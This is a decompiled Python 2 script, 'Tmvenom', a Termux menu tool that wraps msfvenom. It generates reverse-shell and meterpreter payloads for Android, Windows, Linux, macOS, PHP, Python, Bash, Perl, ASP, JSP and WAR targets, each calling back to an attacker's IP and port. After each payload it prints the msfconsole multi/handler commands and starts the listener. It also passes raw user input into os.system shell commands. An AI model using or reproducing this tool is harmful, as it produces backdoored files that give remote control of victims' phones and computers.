
# Decompiled by HTR-TECH | TAHMID RAYAT
# Github : https://github.com/htr-tech
#---------------------------------------
# Auto Dis Parser 2.2.0
# Source File : patched.pyc
# Bytecode Version : 2.7
#---------------------------------------

import os
import sys
import colorama
from colorama import *
import time
red = '\x1b[1;91m'
green = '\x1b[1;92m'
yellow = '\x1b[1;93m'
blue = '\x1b[1;94m'
purple = '\x1b[1;95m'
cyan = '\x1b[1;96m'
white = '\x1b[1;97m'
os.system('clear')
os.system('sh /data/data/com.termux/files/home/tmvenom/core/run2')
os.system('clear')

def pt():
    print ''


def logo():
    print '\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97'
    print '\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91'
    print '   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91'
    print '   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91'
    print '   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91'
    print '   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d   \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d'
    print '\x1b[1;91m'
    slowprint('          < Developed By \x1b[1;96m Technical Mujeeb' + ' \x1b[1;91m for Termux users >')


def auth():
    print '\x1b[1;92m'
    slowprint('Loading Author Information.....')
    print '\x1b[1;92m'
    slowprint('-------------------------------------------------------')
    slowprint('|' + red + ' <=>  ' + green + 'Name      ' + red + '=' + cyan + ' Mujeeb                             ' + green + '|')
    slowprint('|' + red + ' <=>  ' + green + 'Youtube   ' + red + '=' + cyan + ' www.youtube.com/technicalmujeeb    ' + green + '|')
    slowprint('|' + red + ' <=>  ' + green + 'Github    ' + red + '=' + cyan + ' https://github.com/TechnicalMujeeb ' + green + '|')
    slowprint('|' + red + ' <=>  ' + green + 'whatsapp  ' + red + '=' + cyan + ' Termux Cyber                       ' + green + '|')
    slowprint('|' + red + ' <=>  ' + green + 'telegram  ' + red + '=' + cyan + ' Termux Cyber [community]           ' + green + '|')
    slowprint('|' + red + ' <=>  ' + green + 'Instagram ' + red + '=' + cyan + ' @Technical_Mujeeb                  ' + green + '|')
    slowprint('|------------------------------------------------------')
    print ''
    again()


def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1 / 100)
    


def again():
    run = raw_input('\x1b[1;91m\n[e]\x1b[1;92mExit\x1b[1;96m or \x1b[1;91m[Enter]\x1b[1;92m continue ? = \x1b[1;96m  ')
    if run == 'e':
        slowprint('Exiting......')
        print ''
    else:
        os.system('clear')
        menu()


def android():
    pt()
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    pt()
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/mob.apk'
    pt()
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print green + 'Generating payload.....'
    pt()
    os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' R > ' + pay)
    print ''
    print green + 'Successfully Generated'
    print ''
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        print ''
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print Back.BLUE + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload android/meterpreter/reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        print ''
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        os.system('service postgresql start')
        os.system('msfconsole')
        menu()
    else:
        menu()


def windows():
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    print ''
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/win.exe'
    pt()
    pay = raw_input(green + '[->] path and Name  = ')
    pt()
    print cyan + 'Generating payload.....'
    pt()
    os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f exe -a x86 > ' + pay)
    pt()
    print green + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print Fore.CYAN + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print blue + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload windows/meterpreter/reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def mac():
    print ''
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    print ''
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/mac.macho'
    pt()
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print green + 'Generating payload.....'
    pt()
    os.system('msfvenom -p osx/x86/shell_reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f macho > ' + pay)
    pt()
    print Fore.YELLOW + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print blue + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload osx/x86/shell_reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def linux():
    print ''
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    print ''
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/linux.elf'
    print ''
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print Fore.GREEN + 'Generating payload.....'
    pt()
    os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f elf > ' + pay)
    pt()
    print green + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print blue + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload linux/x86/meterpreter/reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def python():
    print ''
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    pt()
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/back.py'
    print ''
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print green + 'Generating payload.....'
    pt()
    os.system('msfvenom -p python/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -o  ' + pay)
    pt()
    print yellow + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        print ''
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print Back.BLUE + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload python/meterpreter/reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLOCAL IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        print ''
        print cyan + '---------------------------------------------------------'
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def php():
    print ''
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    pt()
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/payload.php'
    print ''
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print green + 'Generating payload.....'
    pt()
    os.system('msfvenom -p php/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -o  ' + pay)
    pt()
    print Fore.YELLOW + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print Back.BLUE + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload php/meterpreter/reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLOCAL IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def bash():
    print ''
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    pt()
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/shell.sh'
    print ''
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print green + 'Generating payload.....'
    pt()
    os.system('msfvenom -p cmd/unix/reverse_bash LHOST=' + ip + ' LPORT=' + por + ' -f raw > ' + pay)
    pt()
    print Fore.YELLOW + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print Back.BLUE + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload cmd/unix/reverse_bash'
        print '   set lhost {}   =(\x1b[91mLOCAL IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def perl():
    pt()
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    pt()
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port Number = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/shell.pl'
    print ''
    pay = raw_input(green + '[->] Payload path and Name  = ')
    pt()
    print green + 'Generating payload.....'
    pt()
    os.system('msfvenom -p cmd/unix/reverse_perl LHOST=' + ip + ' LPORT=' + por + ' -f raw > ' + pay)
    pt()
    print Fore.YELLOW + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print cyan + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print Back.BLUE + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload cmd/unix/reverse_perl'
        print '   set lhost {}   =(\x1b[91mLOCAL IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def asp():
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    print ''
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/shall.asp'
    pt()
    pay = raw_input(green + '[->] path and Name  = ')
    pt()
    print cyan + 'Generating payload.....'
    pt()
    os.system('msfvenom -p windows/meterpreter/reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f asp > ' + pay)
    pt()
    print green + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print Fore.CYAN + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print blue + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload windows/meterpreter/reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def jsp():
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    print ''
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/shall.jsp'
    pt()
    pay = raw_input(green + '[->] path and Name  = ')
    pt()
    print cyan + 'Generating payload.....'
    pt()
    os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f raw > ' + pay)
    pt()
    print green + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print Fore.CYAN + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print blue + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload java/jsp_shell_reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def war():
    print red + '  >> ' + cyan + 'Local IP for LAN, Public IP for WAN'
    print ''
    ip = raw_input(green + '[->] Ip Address = ')
    print ''
    print red + '  >> ' + cyan + 'recomended port = 4444'
    pt()
    por = raw_input(green + '[->] Port = ')
    print ''
    print red + '  >> ' + cyan + 'recomended path & name = /sdcard/shall.war'
    pt()
    pay = raw_input(green + '[->] path and Name  = ')
    pt()
    print cyan + 'Generating payload.....'
    pt()
    os.system('msfvenom -p java/jsp_shell_reverse_tcp LHOST=' + ip + ' LPORT=' + por + ' -f war > ' + pay)
    pt()
    print green + 'Successfully Generated'
    pt()
    yan = raw_input(yellow + '    Are You want to start listner (y/n) =>  ')
    if yan == 'y':
        pt()
        print Fore.CYAN + '----------------COMMANDS FOR EXPLOIT---------------------'
        print '\x1b[00m'
        print blue + '   copy and paste Below commands in msfconsole        \x1b[00m      '
        print '\x1b[1;93m'
        print '   use multi/handler'
        print '   set payload java/jsp_shell_reverse_tcp'
        print '   set lhost {}   =(\x1b[91mLocal IP\x1b[00m)'.format(ip)
        print '\x1b[1;93m   set lport {} '.format(por)
        print '   exploit'
        pt()
        print cyan + '---------------------------------------------------------'
        pt()
        print 'PLEASE WAIT MSFCONSOLE STARTING....'
        pt()
        os.system('msfconsole')
        menu()
    else:
        menu()


def menu():
    os.system('clear')
    print '\x1b[1;92m'
    logo()
    pt()
    print red + '      <<---------------[ PAYLOAD MENU ]---------------->>   v 2.0'
    pt()
    print red + '   [a] ==>' + green + ' Author info ' + red + '      [h] ==>' + green + ' help '
    pt()
    print red + '   [1] ==>' + green + ' Android payload ' + red + '  [l] ==>' + green + ' all payload list '
    pt()
    print red + '   [2] ==>' + green + ' Python Payload  '
    pt()
    print red + '   [3] ==>' + green + ' Php Payload   '
    pt()
    print red + '   [4] ==>' + green + ' Windows Payload  '
    pt()
    print red + '   [5] ==>' + green + ' Linux Payload  '
    pt()
    print red + '   [6] ==>' + green + ' Mac Payload  '
    pt()
    print red + '   [7] ==>' + green + ' Perl Payload  '
    pt()
    print red + '   [8] ==>' + green + ' Bash Payload  '
    pt()
    print red + '   [9] ==>' + green + ' Asp Payload  '
    pt()
    print red + '   [10] ==>' + green + ' Jsp Payload  '
    pt()
    print red + '   [11] ==>' + green + ' War Payload    '
    pt()
    print red + '--------------------------------------------'
    pt()
    op = raw_input('\x1b[1;96mSelect@[\x1b[1;91m Tmvenom \x1b[1;96m]#:\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9d\xaf \x1b[1;92m')
    if op == '1':
        os.system('clear')
        pt()
        android()
    elif op == '2':
        os.system('clear')
        pt()
        python()
    elif op == '3':
        os.system('clear')
        pt()
        php()
    elif op == '4':
        os.system('clear')
        pt()
        windows()
    elif op == '5':
        os.system('clear')
        pt()
        linux()
    elif op == '6':
        os.system('clear')
        pt()
        mac()
    elif op == '7':
        os.system('clear')
        pt()
        perl()
    elif op == '8':
        os.system('clear')
        pt()
        bash()
    elif op == '9':
        os.system('clear')
        pt()
        asp()
    elif op == '10':
        os.system('clear')
        pt()
        jsp()
    elif op == '11':
        os.system('clear')
        pt()
        war()
    elif op == 'l':
        pt()
        os.system('msfvenom -l')
        pt()
        again()
    elif op == 'h':
        pt()
        print cyan + '   <<<   msfvenom help   >>>'
        print green
        os.system('msfvenom -h')
        pt()
        print cyan + '   <<<   msfconsole help   >>>'
        print green
        os.system('msfconsole -h')
        pt()
        again()
    elif op == 'a':
        auth()
    elif op == 'e':
        print '\x1b[1;92m Exiting......'
    else:
        again()

menu()
